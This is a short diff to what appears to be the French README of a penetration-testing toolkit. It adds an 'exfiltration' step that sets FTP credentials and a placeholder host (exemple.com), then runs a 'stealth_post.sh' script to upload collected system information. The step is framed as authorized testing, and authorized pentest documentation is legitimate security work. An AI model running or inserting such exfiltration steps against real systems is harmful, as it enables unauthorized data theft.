@@ -84,6 +84,12 @@ bash scripts/linux/pentest_discovery.sh
 bash scripts/linux/pentest_verification.sh
 # Phase d'exploitation (si autorisée)
 bash scripts/linux/pentest_exploitation.sh
+# Exfiltration basique (si autorisée)
+export FTP_USER="utilisateur"
+export FTP_PASS="motdepasse"
+export FTP_HOST="exemple.com"
+export FTP_PATH="uploads/sysinfo.txt"
+bash scripts/linux/stealth_post.sh
 ```
 
 ## ⚠️ Disclaimer / Avertissement
